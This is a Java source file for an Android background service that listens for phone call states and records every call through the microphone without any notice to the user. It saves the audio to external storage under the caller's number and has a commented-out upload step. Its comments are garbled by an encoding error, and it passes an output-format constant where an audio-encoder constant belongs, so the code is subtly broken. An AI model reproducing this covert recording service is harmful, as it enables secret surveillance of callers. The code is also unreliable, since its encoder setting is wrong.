package service;
import java.io.File;
import java.io.IOException;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;


public class PhoneService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
	}

	private final class PhoneListener extends PhoneStateListener {

		private String incomingNumber;
		private MediaRecorder mediaRecorder;
		private File file;
		@SuppressLint("InlinedApi")
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			//super.onCallStateChanged(state, incomingNumber);
			switch (state) {
			case TelephonyManager.CALL_STATE_RINGING://����
				this.incomingNumber = incomingNumber;
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK://��ͨ�绰
				try {
					file = new File(Environment.getExternalStorageDirectory(), this.incomingNumber + System.currentTimeMillis() + ".3gp");
					mediaRecorder = new MediaRecorder();
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					mediaRecorder.prepare();
					mediaRecorder.start();//��ʼ¼��
				} catch (IllegalStateException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
				break;
			case TelephonyManager.CALL_STATE_IDLE://�Ҷϵ绰�ص�����״̬
				if(null != mediaRecorder) {
					mediaRecorder.stop();
					mediaRecorder.release();
					mediaRecorder = null;
					//uploadFile();
				}
				break;
			default:
				break;
			}
		}
		
	}
}
